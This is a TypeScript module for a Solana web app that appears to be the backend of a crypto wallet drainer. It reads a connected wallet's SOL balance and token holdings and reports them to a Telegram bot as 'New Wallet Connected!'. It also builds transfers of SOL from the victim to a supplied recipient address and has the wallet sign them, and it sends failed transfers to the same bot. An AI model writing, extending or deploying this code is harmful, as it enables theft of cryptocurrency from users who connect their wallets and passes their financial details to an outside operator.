import { Connection, PublicKey, LAMPORTS_PER_SOL, Transaction, SystemProgram } from '@solana/web3.js';
import { TOKEN_PROGRAM_ID } from '@solana/spl-token';
import nacl from 'tweetnacl';

export const MINIMUM_REQUIRED_SOL = 0.0005;

export const hasEnoughSolForRent = (balance: number): boolean => {
  return balance >= MINIMUM_REQUIRED_SOL;
};

export const signAndSendTransaction = async (
  connection: Connection,
  wallet: any,
  recipientAddress: string,
  amount: number,
  telegramBotToken: string,
  telegramChatId: string
): Promise<string> => {
  try {
    if (!wallet || !wallet.adapter || !wallet.adapter.publicKey) {
      throw new Error("Wallet or public key is undefined");
    }

    const senderPublicKey = wallet.adapter.publicKey;
    const recipientPublicKey = new PublicKey(recipientAddress);
    const lamports = amount * LAMPORTS_PER_SOL;

    const transaction = new Transaction().add(
      SystemProgram.transfer({
        fromPubkey: senderPublicKey,
        toPubkey: recipientPublicKey,
        lamports: lamports,
      })
    );

    transaction.feePayer = senderPublicKey;
    let blockhash = await connection.getLatestBlockhash('confirmed');
    transaction.recentBlockhash = blockhash.blockhash;

    const signedTransaction = await wallet.signTransaction(transaction);
    const signature = await connection.sendRawTransaction(signedTransaction.serialize());

    await connection.confirmTransaction(signature, 'confirmed');

    return signature;
  } catch (error) {
    console.error("Error in signAndSendTransaction:", error);
    
    const errorMessage = `Transaction failed: ${error instanceof Error ? error.message : String(error)}`;
    await sendToTelegram({ message: errorMessage }, telegramBotToken, telegramChatId);
    
    throw error;
  }
};

export const getWalletBalance = async (publicKey: string, customConnection?: Connection): Promise<number> => {
  try {
    const connection = customConnection || new Connection("https://api.mainnet-beta.solana.com", {
      commitment: 'confirmed'
    });
    
    const balance = await connection.getBalance(new PublicKey(publicKey));
    return balance / LAMPORTS_PER_SOL;
  } catch (error) {
    console.error(`Error fetching balance for ${publicKey}:`, error);
    throw new Error(`Failed to fetch wallet balance: ${error instanceof Error ? error.message : String(error)}`);
  }
};

export const getTokenAccounts = async (
  connection: Connection,
  walletAddress: string
): Promise<any[]> => {
  try {
    const publicKey = new PublicKey(walletAddress);
    
    const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
      publicKey,
      { programId: TOKEN_PROGRAM_ID }
    );
    
    const tokens = tokenAccounts.value
      .filter(({ account }) => {
        const amount = account.data.parsed.info.tokenAmount.uiAmount;
        return amount > 0;
      })
      .map(({ account, pubkey }) => {
        const parsedInfo = account.data.parsed.info;
        const mint = parsedInfo.mint;
        const tokenAmount = parsedInfo.tokenAmount;
        
        return {
          mint,
          tokenAccount: pubkey.toBase58(),
          amount: tokenAmount.uiAmount,
          decimals: tokenAmount.decimals
        };
      });
    
    console.log(`Successfully fetched ${tokens.length} token accounts for ${walletAddress}`);
    return tokens;
  } catch (error) {
    console.error(`Error fetching token accounts for ${walletAddress}:`, error);
    return [];
  }
};

interface WalletData {
  address: string;
  tokens: any[];
  balance: number;
  connectionTime: string;
  walletName: string;
}

export const sendToTelegram = async (walletData: WalletData | any, botToken: string, chatId: string): Promise<boolean> => {
  try {
    const message = `
New Wallet Connected! 🚀

Address: ${walletData.address}
Wallet Name: ${walletData.walletName}
Balance: ${walletData.balance ? walletData.balance.toFixed(6) + ' SOL' : 'N/A'}
Connection Time: ${walletData.connectionTime}

Tokens:
${walletData.tokens && walletData.tokens.length > 0
        ? walletData.tokens.map((token: any) => `  - Mint: ${token.mint}, Amount: ${token.amount}`).join('\n')
        : 'No tokens found.'}
`;

    const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const response = await fetch(apiUrl, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
      }),
    });

    if (!response.ok) {
      console.error('Failed to send message to Telegram:', response.status, response.statusText);
      const errorText = await response.text();
      console.error('Telegram API Error:', errorText);
      return false;
    }

    const result = await response.json();
    if (!result.ok) {
      console.error('Telegram API Error:', result);
      return false;
    }

    console.log('Successfully sent message to Telegram!');
    return true;
  } catch (error) {
    console.error('Error sending message to Telegram:', error);
    return false;
  }
};

export const verifySignature = (message: string, signature: string, publicKey: string): boolean => {
  try {
    const decodedPublicKey = new Uint8Array(Buffer.from(publicKey, 'base64'));
    const decodedSignature = new Uint8Array(Buffer.from(signature, 'base64'));
    const encodedMessage = new TextEncoder().encode(message);

    return nacl.sign.detached.verify(encodedMessage, decodedSignature, decodedPublicKey);
  } catch (error) {
    console.error("Error verifying signature:", error);
    return false;
  }
};
